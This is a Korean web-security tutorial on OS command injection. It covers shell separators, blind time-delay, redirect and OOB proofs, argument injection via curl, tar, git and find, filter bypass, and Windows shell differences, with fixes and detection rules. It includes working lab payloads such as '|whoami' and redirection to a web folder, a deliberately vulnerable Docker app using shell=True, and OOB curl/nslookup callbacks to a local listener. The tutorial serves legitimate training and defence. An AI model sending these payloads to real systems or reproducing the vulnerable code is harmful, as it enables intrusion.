---
title: 웹 취약점 진단 OS 명령 주입편 — 셸 문맥부터 Blind와 인자 주입까지
description: "셸 문맥별 구분자, Blind 증명, curl·tar·git·find 인자 주입, 필터 우회와 Windows 차이를 재현 가능한 실습으로 정리했습니다."
tags:
  - 웹보안
  - 취약점진단
  - OS Command Injection
  - Blind Command Injection
  - Argument Injection
---

> [!warning] 허가된 환경에서만
> 아래 요청은 **PortSwigger Web Security Academy 또는 이 글의 `127.0.0.1` Docker 실습 앱에서만** 실행하세요. 운영 서비스, 타인의 시스템, 인터넷의 임의 호스트에는 보내지 않습니다. OOB 수신기도 localhost에만 열고, 성공 증거는 `whoami`, 짧은 지연, 임시 문자열처럼 영향이 작은 값으로 제한합니다.

[[웹 취약점 진단 기법 입문 — XXE, SSRF부터 SQLi, XSS까지#8. Command Injection (OS 명령어 삽입)|입문편]]에서 다룬 정의를 한 문장으로 줄이면, **외부 입력이 셸 문법이나 프로그램 옵션으로 다시 해석되는 경계 실패**입니다. 이번 글은 “특수문자를 넣었더니 500이 났다”에서 멈추지 않고, 어느 해석기가 어떤 문맥에서 입력을 소비했는지 재현 가능한 증거로 좁힙니다.

## 기법 요약표

| 기법 | 단서 기능 | 성립 조건 | 영향 |
|---|---|---|---|
| 셸 구분자·치환 | Ping, 변환기, 백업, 진단 도구 | 입력이 `sh -c`·`cmd /c`·PowerShell 명령 문자열에 결합됨 | 웹 프로세스 권한의 명령 실행 |
| Blind 시간 지연 | 작업 결과가 응답에 안 보이는 메일·배치·비동기 기능 | 주입 명령이 동기 실행되거나 지연을 관찰할 수 있음 | 실행 여부 확인, 조건 기반 추론 |
| 출력 리다이렉트 | 쓰기 가능한 정적 디렉터리 | 셸 리다이렉션이 해석되고 결과 파일을 HTTP로 읽을 수 있음 | 명령 출력 회수 |
| OOB DNS·HTTP | 응답·파일 출력이 모두 없음 | 프로세스가 localhost 수신기로 DNS 질의 또는 HTTP 연결 가능 | 비동기 실행 확인 |
| 인자 주입 | `curl`, `tar`, `git`, `find` 래퍼 | 셸은 없어도 비신뢰 값이 옵션 위치에 들어가고 대상 CLI가 위험 옵션을 제공 | 파일 쓰기·외부 요청·보조 프로그램 실행 |
| 필터 우회 | 금칙문자 치환·WAF | 검사 후 셸이 `${IFS}`, 줄바꿈, 와일드카드, 다중 디코딩을 재해석 | 불완전한 차단 우회 |
| Windows 문맥 차이 | Windows 진단·관리 기능 | `cmd.exe` 또는 PowerShell을 명시적으로 호출 | 플랫폼별 구분자·확장 규칙에 따른 실행 |

---

## 1. 셸 문맥별 구분자 — `;`, `|`, `&&`, `$()`, 줄바꿈

### 원리·단서 기능·성립 조건

다음 두 코드는 겉으로 비슷하지만 공격 표면이 다릅니다.

```python
# 취약: 문자열 전체를 셸이 다시 파싱한다.
subprocess.run(f"ping -c 1 {host}", shell=True, check=False)

# 셸 구분자는 데이터가 되지만, host가 옵션이 되는 인자 주입은 별도 검증해야 한다.
subprocess.run(["ping", "-c", "1", host], shell=False, check=False)
```

첫 코드에서 `;`는 앞 명령의 성공 여부와 무관하게 다음 명령을 시작하고, `&&`는 앞 명령이 성공했을 때만, `|`는 앞 명령의 표준 출력을 다음 프로세스의 표준 입력으로 연결합니다. `$()`는 **현재 인자 안에 명령 출력을 치환**하므로 따옴표 안에서도 동작할 수 있습니다. URL 디코딩된 `%0a`가 실제 LF가 되면 줄바꿈도 새 명령의 경계가 됩니다.

의심할 기능은 Ping/Traceroute/DNS 진단, 이미지·PDF·영상 변환, 압축·백업, Git 작업, 로그 검색, 프린터·메일 전송처럼 서버가 외부 실행 파일을 부르는 곳입니다. 다만 `;`에 500이 발생한 것만으로는 성립하지 않습니다. 실제로 셸을 거치는지, 입력이 작은따옴표·큰따옴표·명령 치환·옵션 중 어디에 놓이는지 확인해야 합니다.

### 따라하기 — PortSwigger `OS command injection, simple case`

- 랩: [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
- Burp에서 재고 확인 요청을 Repeater로 보낸 뒤 `storeID=1|whoami`로 바꿉니다.

```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

productId=1&storeId=1%7Cwhoami
```

응답 본문에 재고 숫자와 함께 OS 사용자명이 나타나면 성공입니다. 비교군으로 원래 값, `1|printf CMD_PROOF`, 존재하지 않는 명령을 각각 보내 응답 차이가 명령 실행과 일치하는지 봅니다. `;`, `&&`, `%0a`, `$()`는 대상 문맥에 따라 하나씩만 바꾸고, 한 요청에 여러 기법을 섞지 않습니다.

### 진단 체크리스트와 오탐 구분

- 응답에 입력 문자열이 단순 반사된 것인가, `whoami`의 **실행 결과**인가?
- 정상·참 조건(`&&`)·실패 조건을 3회 이상 반복해 일관성을 확인했는가?
- 셸 오류가 애플리케이션 검증 오류나 프록시 차단과 구분되는가?
- 따옴표 안이라면 먼저 그 문맥을 닫아야 하는가? `$()`가 치환되는 큰따옴표와 치환되지 않는 작은따옴표를 구분했는가?
- URL 디코딩이 한 번인지 여러 번인지 확인했는가? `%250a`를 무조건 우회로 단정하지 않았는가?

### 조치

가능하면 OS 명령을 언어 API로 바꿉니다. DNS는 DNS 라이브러리, 압축은 아카이브 라이브러리, HTTP는 HTTP 클라이언트를 사용합니다. 실행이 불가피하면 실행 파일을 고정하고 배열 인자로 전달하며 각 피연산자를 허용 목록으로 검증합니다.

```python
import ipaddress
import subprocess


def ping_once(raw_host: str) -> subprocess.CompletedProcess[str]:
    host = str(ipaddress.ip_address(raw_host))
    return subprocess.run(
        ["/bin/ping", "-c", "1", "--", host],
        shell=False,
        check=False,
        capture_output=True,
        text=True,
        timeout=3,
    )
```

배열 인자는 셸 문법을 제거하지만 **인자 의미까지 안전하게 만들지는 않습니다**. `--`로 옵션 파싱을 끝낼 수 있는 프로그램은 이를 사용하고, 그 뒤 값도 IP·파일 ID·허용 경로처럼 업무 규칙으로 검증합니다.

### 탐지 포인트

- 웹 프로세스가 `sh`, `bash`, `cmd.exe`, `powershell.exe`를 자식으로 만든 이벤트
- 요청 파라미터의 `;`, `|`, `$(`, CR/LF와 직후 프로세스 생성의 상관관계
- 평소 없던 `whoami`, `id`, `nslookup`, `curl` 자식 프로세스와 비정상 종료 코드
- 정적 디렉터리에 웹 프로세스가 새 텍스트 파일을 쓴 이벤트

### 출처

- [PortSwigger — OS command injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP — OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)

---

## 2. Blind 명령 주입 — 시간, 파일, localhost OOB로 증명하기

### 원리·단서 기능·성립 조건

메일 발송, 피드백 처리, 백그라운드 변환처럼 명령의 표준 출력이 HTTP 응답으로 돌아오지 않으면 Blind입니다. 이때 증거 채널을 순서대로 낮은 영향부터 선택합니다.

1. **시간 지연**: 동기 처리라면 `sleep`이나 loopback `ping`의 지연을 비교합니다.
2. **출력 리다이렉트**: 쓰기 가능한 정적 폴더가 있을 때만 짧은 증거를 파일로 보냅니다.
3. **OOB DNS·HTTP**: 이 글의 Docker 네트워크 안 `listener:53/udp` 또는 `listener:9000`으로 한 번 요청합니다. 인터넷 콜백 도메인을 쓰지 않습니다.

### 따라하기 A — PortSwigger `Blind OS command injection with time delays`

- 랩: [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
- 피드백 요청의 `email`을 `x%26+ping+-c+10+127.0.0.1+%26`로 바꿉니다.
- 같은 요청을 원래 값과 교대로 3회씩 보내 약 10초의 안정적인 차이가 나는지 확인합니다.

성공 기준은 한 번 느린 것이 아니라 **대조군은 즉시, 시험군은 반복해서 지정한 시간만큼 지연**되는 것입니다. 큐 대기, GC, 네트워크 변동은 무작위로 흔들리므로 고정 지연과 구분합니다.

### 따라하기 B — PortSwigger `Blind OS command injection with output redirection`

- 랩: [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

```http
POST /feedback/submit HTTP/2
Content-Type: application/x-www-form-urlencoded

name=test&email=x%7C%7Cwhoami%3E%2Fvar%2Fwww%2Fimages%2Foutput.txt%7C%7C&subject=test&message=test
```

이후 `GET /image?filename=output.txt`에서 사용자명이 반환되면 성공입니다. Academy가 지정한 쓰기 경로와 파일만 사용하고 다른 파일을 덮어쓰지 않습니다.

### 따라하기 C — localhost Docker DNS·HTTP OOB

아래 앱은 호스트 포트를 모두 `127.0.0.1`에만 바인딩합니다. 파일 네 개를 빈 폴더에 저장합니다.

`compose.yaml`

```yaml
services:
  app:
    build: .
    command: ["python", "/lab/app.py"]
    ports:
      - "127.0.0.1:18080:8080"
  listener:
    build: .
    command: ["python", "/lab/listener.py"]
    ports:
      - "127.0.0.1:19000:9000"
      - "127.0.0.1:19553:53/udp"
```

`Dockerfile`

```dockerfile
FROM python:3.13-alpine
RUN apk add --no-cache bind-tools curl git findutils tar
WORKDIR /lab
COPY app.py listener.py /lab/
```

`app.py`

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from subprocess import run
from urllib.parse import parse_qs, urlparse


class Handler(BaseHTTPRequestHandler):
    def send_text(self, status: int, body: str) -> None:
        data = body.encode()
        self.send_response(status)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        value = parse_qs(parsed.query).get("value", [""])[0]
        if parsed.path == "/shell":
            result = run(f"printf 'target='; echo {value}", shell=True, capture_output=True, text=True)
            self.send_text(200, result.stdout + result.stderr)
            return
        if parsed.path == "/blind":
            run(f"printf '%s' {value} >/dev/null", shell=True, timeout=8)
            self.send_text(202, "queued\n")
            return
        if parsed.path == "/filtered":
            if " " in value or ";" in value:
                self.send_text(400, "blocked\n")
                return
            result = run(f"echo {value}", shell=True, capture_output=True, text=True)
            self.send_text(200, result.stdout + result.stderr)
            return
        if parsed.path == "/arg":
            tool = parse_qs(parsed.query).get("tool", [""])[0]
            allowed = {"curl": "/usr/bin/curl", "tar": "/bin/tar", "git": "/usr/bin/git", "find": "/usr/bin/find"}
            if tool not in allowed:
                self.send_text(400, "unknown tool\n")
                return
            result = run([allowed[tool], value], capture_output=True, text=True, timeout=5)
            self.send_text(200, result.stdout + result.stderr)
            return
        self.send_text(404, "not found\n")


HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
```

`listener.py`

```python
import socket
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer


def read_qname(packet: bytes) -> str:
    labels: list[str] = []
    offset = 12
    while offset < len(packet):
        length = packet[offset]
        if length == 0:
            break
        offset += 1
        labels.append(packet[offset : offset + length].decode("ascii", errors="replace"))
        offset += length
    return ".".join(labels)


def serve_dns() -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server:
        server.bind(("0.0.0.0", 53))
        while True:
            packet, address = server.recvfrom(512)
            print(f"DNS_PROOF {read_qname(packet)}", flush=True)
            header = packet[:2] + b"\x81\x83" + packet[4:6] + b"\x00\x00\x00\x00\x00\x00"
            server.sendto(header + packet[12:], address)


class Handler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        print(f"OOB_PROOF {self.path}", flush=True)
        self.send_response(204)
        self.end_headers()


threading.Thread(target=serve_dns, daemon=True).start()
HTTPServer(("0.0.0.0", 9000), Handler).serve_forever()
```

실행과 요청은 다음과 같습니다.

```bash
docker compose up --build -d

# 직접 출력
curl 'http://127.0.0.1:18080/shell?value=ok%3Bprintf%20CMD_PROOF'
# 기대: target=ok 다음에 CMD_PROOF

# Blind 시간 지연: 기준 요청과 약 2초 차이
curl -s -o /dev/null -w '%{time_total}\n' 'http://127.0.0.1:18080/blind?value=ok'
curl -s -o /dev/null -w '%{time_total}\n' 'http://127.0.0.1:18080/blind?value=ok%3Bsleep%202'

# OOB는 Docker 내부의 localhost 실습 수신기로만 전송
curl 'http://127.0.0.1:18080/blind?value=ok%3Bcurl%20-s%20http%3A%2F%2Flistener%3A9000%2Fcmd-proof'
curl 'http://127.0.0.1:18080/blind?value=ok%3Bnslookup%20dns-proof%20listener'
docker compose logs listener
# 기대: OOB_PROOF /cmd-proof, DNS_PROOF dns-proof
```

> [!success] 직접 검증
> 2026-11-27에 위 구성으로 직접 빌드했습니다. `/shell`에서 `CMD_PROOF`, `/blind`에서 약 2초 지연, listener 로그에서 `OOB_PROOF /cmd-proof`와 `DNS_PROOF dns-proof`를 확인했습니다. Academy 랩은 URL과 공식 절차를 대조했지만 개인 랩 인스턴스를 완료 처리하지는 않았습니다.

### 진단 체크리스트와 오탐 구분

- 시간 지연은 대조군·시험군을 교차 반복하고 중앙값으로 비교했는가?
- 리다이렉트 파일은 새 난수 이름이며 기존 파일을 덮어쓰지 않는가?
- OOB 요청에 요청별 nonce를 넣어 이전 로그와 구분했는가?
- DNS만 관찰하고 HTTP까지 성공했다고 보고하지 않았는가?
- 비동기 작업은 HTTP 응답이 끝난 뒤에도 충분히 로그를 관찰했는가?

### 조치·탐지 포인트

리다이렉트·파이프가 필요한 설계를 애플리케이션 코드의 파일 I/O와 파이프로 바꾸고, 웹 루트는 웹 프로세스에 쓰기 금지로 둡니다. EDR에서는 웹 프로세스의 `sleep`, `ping`, `curl`, `nslookup` 실행과 신규 아웃바운드 연결을 연결해 경보합니다. 컨테이너는 기본 거부 egress, 읽기 전용 루트 파일시스템, 비루트 UID를 적용합니다.

### 출처

- [PortSwigger — Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
- [PortSwigger — Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)

---

## 3. 인자 주입 — 셸이 없어도 `curl`, `tar`, `git`, `find`가 해석한다

### 원리·단서 기능·성립 조건

`execve()` 배열 호출은 `;`를 무력화하지만, 비신뢰 값이 `-`로 시작하면 대상 프로그램이 **옵션**으로 해석할 수 있습니다. 이것이 인자 주입입니다. 성립 조건은 (1) 입력이 별도 인자로 전달되고, (2) 옵션 앞에 놓이거나 옵션 종료가 없으며, (3) 해당 CLI에 보안 영향을 주는 옵션이 있는 것입니다.

| 프로그램 | 안전한 관찰용 단서 | 실제 진단에서 검토할 위험 |
|---|---|---|
| `curl` | `--version`, `--help`가 URL 대신 옵션으로 동작 | 출력 파일, 프록시, 설정 파일, 추가 URL, 프로토콜 |
| `tar` | `--version`이 아카이브명 대신 옵션으로 동작 | 체크포인트 액션, 파일 덮어쓰기, 절대·상위 경로 |
| `git` | `--version`이 저장소 경로 대신 옵션으로 동작 | `-c` 설정, 외부 helper, hook·pager·protocol 설정 |
| `find` | `--help` 또는 표현식이 경로 대신 파싱됨 | `-exec`, `-delete`, 표현식 순서 |

### 따라하기 — 위 localhost Docker 앱

```bash
curl 'http://127.0.0.1:18080/arg?tool=curl&value=--version'
curl 'http://127.0.0.1:18080/arg?tool=tar&value=--version'
curl 'http://127.0.0.1:18080/arg?tool=git&value=--version'
curl 'http://127.0.0.1:18080/arg?tool=find&value=--help'
```

각 응답에 버전·도움말이 나오면, 값이 단순 URL·파일명·경로가 아니라 **옵션 문법으로 해석됨**을 안전하게 증명합니다. 이는 영향의 상한을 증명하지 않으므로 바로 RCE로 보고하지 않습니다. 대상 프로그램의 실제 고정 인자, 버전, 권한을 바탕으로 가능한 옵션과 영향까지 별도로 입증해야 합니다.

### 진단 체크리스트와 오탐 구분

- 코드가 정말 배열 인자를 쓰는가, 중간 래퍼가 다시 셸 문자열로 합치는가?
- 비신뢰 값 앞에 `--`가 있는가? 프로그램이 `--`를 지원하고 그 뒤에도 추가 피연산자를 받는가?
- `curl -- URL`도 여러 URL과 SSRF를 자동 방지하지는 않는다는 점을 반영했는가?
- `tar`·`git`처럼 설정·helper를 실행할 수 있는 프로그램은 환경 변수와 작업 디렉터리도 고정했는가?
- 도움말 출력만으로 파일 쓰기나 코드 실행을 과장하지 않았는가?

### 조치

```java
URI uri = URI.create(rawUrl);
if (!uri.getScheme().equals("https") || !uri.getHost().equals("example.com")) {
    throw new IllegalArgumentException("destination not allowed");
}
ProcessBuilder pb = new ProcessBuilder(
    "/usr/bin/curl", "--fail", "--silent", "--show-error",
    "--globoff", "--", uri.toASCIIString()
);
pb.redirectErrorStream(true);
Process process = pb.start();
```

가장 좋은 조치는 Java HTTP Client 같은 언어 API로 교체하는 것입니다. CLI가 꼭 필요하면 실행 파일·옵션·환경·작업 디렉터리를 고정하고, 입력 하나를 업무 타입으로 파싱·정규화한 뒤 정확히 한 인자로 전달합니다.

### 탐지 포인트·출처

프로세스 감사 로그에서 웹 프로세스가 실행한 명령의 argv를 수집하고, 평소 피연산자 위치에서 `-`로 시작하는 값, `-c`, `--config`, `--proxy`, `-exec` 같은 고위험 옵션을 경보합니다.

- [OWASP — Argument Injection](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#argument-injection)
- [POSIX — Utility Syntax Guidelines](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap12.html)

---

## 4. 필터 우회 — 공백 대체, 와일드카드, 인코딩

### 원리·단서 기능·성립 조건

문자 삭제식 필터는 입력 시점의 문자열만 봅니다. 그 뒤 URL 디코더와 셸이 `${IFS}`를 공백으로 확장하거나, `?`·`*`를 파일명으로 펼치거나, LF를 명령 경계로 해석하면 검사한 문자열과 실행 문자열이 달라집니다. 따라서 우회의 핵심은 “어떤 문자열 트릭”이 아니라 **검사와 최종 해석 사이의 변환 순서 차이**입니다.

### 따라하기 — 위 localhost Docker 앱

```bash
# 리터럴 세미콜론과 공백은 차단
curl -i 'http://127.0.0.1:18080/filtered?value=ok%3Bid'

# 줄바꿈은 새 명령 경계, ${IFS}는 셸에서 공백으로 확장
curl 'http://127.0.0.1:18080/filtered?value=ok%0aprintf%24%7BIFS%7DFILTER_PROOF'
# 기대: ok 다음 줄에 FILTER_PROOF
```

와일드카드는 현재 디렉터리 파일에 의존해 결과가 달라지므로, 진단에서는 먼저 제어한 임시 디렉터리에서만 확장 결과를 관찰합니다. `%2524%257BIFS%257D` 같은 이중 인코딩도 실제 디코딩 단계가 둘임을 입증한 뒤에만 사용합니다.

### 진단 체크리스트와 오탐 구분

- 원문·프록시 해석값·애플리케이션 값·셸 argv를 각각 기록했는가?
- `${IFS}`는 POSIX 셸 계열의 확장이지 Windows `cmd.exe` 문법이 아님을 구분했는가?
- `*`가 우연히 빈 결과나 다른 파일로 확장된 것을 성공으로 오판하지 않았는가?
- 필터 차단 우회와 최종 명령 실행을 별도 증거로 남겼는가?

### 조치·탐지 포인트·출처

블랙리스트를 늘리는 방식은 중단하고 셸을 제거합니다. 검증은 필요한 경우 모든 디코딩·정규화를 한 번만 수행한 **정규형**에 허용 목록으로 적용합니다. 원문과 정규형의 차이가 크거나 CR/LF, `${`, 와일드카드가 들어온 요청을 기록하되 로그 인젝션을 막기 위해 제어 문자는 이스케이프합니다.

- [OWASP — Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [GNU Bash manual — Shell Expansions](https://www.gnu.org/software/bash/manual/html_node/Shell-Expansions.html)

---

## 5. Windows `cmd.exe`와 PowerShell 차이

### 원리·단서 기능·성립 조건

Windows라고 하나의 셸이 아닙니다. `ProcessStartInfo.UseShellExecute=false`로 실행 파일을 직접 시작하면 아래 구분자는 셸 문법이 아니지만, `cmd.exe /c`나 `powershell.exe -Command`에 문자열을 넘기면 다시 코드가 됩니다.

| 문맥 | 명령 연결·치환 | 주의할 quoting·확장 |
|---|---|---|
| POSIX `sh` | `;`, `&&`, `||`, `|`, `$()`, LF | 작은따옴표는 확장 억제, 큰따옴표 안 `$()`는 동작 |
| `cmd.exe /c` | `&`, `&&`, `||`, `|`, CR/LF | `%VAR%`, 지연 확장 시 `!VAR!`, `^` 이스케이프 |
| PowerShell `-Command` | `;`, 파이프, 줄바꿈, `$(...)` | `$env:NAME`, 백틱 이스케이프, 호출 연산자 `&` |

PowerShell 7의 `&&`·`||`와 Windows PowerShell 5.1의 지원 차이도 있으므로 버전을 기록합니다. `%COMSPEC%` 확장과 PowerShell `$env:ComSpec`를 섞지 않습니다.

### 따라하기 — 로컬 셸 파서 비교

Windows 개발 PC의 **자기 PowerShell**에서 다음 무해한 명령만 실행합니다.

```powershell
cmd.exe /d /c "echo FIRST & echo CMD_PROOF"
powershell.exe -NoProfile -Command "Write-Output FIRST; Write-Output PS_PROOF"
pwsh -NoProfile -Command 'Write-Output FIRST; Write-Output $("PS_SUBSTITUTION")'
```

두 증거 문자열이 각각 출력되면 해당 셸의 문장 경계가 해석된 것입니다. 웹 요청에 적용하기 전, 서버 코드가 실제로 어느 셸을 호출하는지 프로세스 생성 로그나 소스에서 확인합니다.

> [!success] 직접 검증 범위
> 2026-11-27에 Windows `cmd.exe`와 Windows PowerShell 5.1에서 각각 `CMD_PROOF`, `PS_PROOF` 출력을 확인했습니다. 이 호스트에는 `pwsh`가 설치되어 있지 않아 PowerShell 7 명령은 직접 검증하지 못했으며, 버전별 `&&`·`||` 차이는 아래 Microsoft 문서를 기준으로만 정리했습니다.

### 진단 체크리스트·조치·탐지 포인트

- 단순 `Process.Start(exe, args)`를 `cmd /c`와 동일하다고 오판하지 않았는가?
- 서비스 계정 권한, PowerShell 버전, Constrained Language Mode를 기록했는가?
- `ProcessStartInfo.FileName`은 신뢰된 절대 경로로 고정하고 `UseShellExecute=false`인가?
- 최신 .NET에서는 `ArgumentList.Add()`로 각 인자를 분리하고, 각 값도 허용 목록으로 검사하는가?

```csharp
var start = new ProcessStartInfo {
    FileName = @"C:\Windows\System32\ping.exe",
    UseShellExecute = false,
    RedirectStandardOutput = true,
};
start.ArgumentList.Add("-n");
start.ArgumentList.Add("1");
start.ArgumentList.Add(validatedIpAddress);
using var process = Process.Start(start)!;
```

Windows 이벤트 4688 또는 Sysmon Event ID 1에서 IIS·애플리케이션 풀 자식으로 생성된 `cmd.exe`, `powershell.exe`, `pwsh.exe`와 인코딩된 명령, 비정상 부모-자식 관계를 탐지합니다.

### 출처

- [Microsoft — ProcessStartInfo.ArgumentList](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.argumentlist)
- [Microsoft — about_Parsing](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_parsing)

---

## 다음 단계로 이어지는 공격

OS 명령 실행은 보통 웹 서비스 계정의 셸에서 시작하지만, 그 권한으로 설정 파일·환경 변수·클라우드 자격증명을 읽거나 내부망에 연결할 수 있습니다. 이후에는 자격증명 재사용, 내부 서비스 이동, 권한 상승, 지속성 확보로 이어질 수 있으므로 **실행 증거에서 멈추고** 영향 범위는 최소 권한·egress·시크릿 접근 권한을 기준으로 평가합니다.
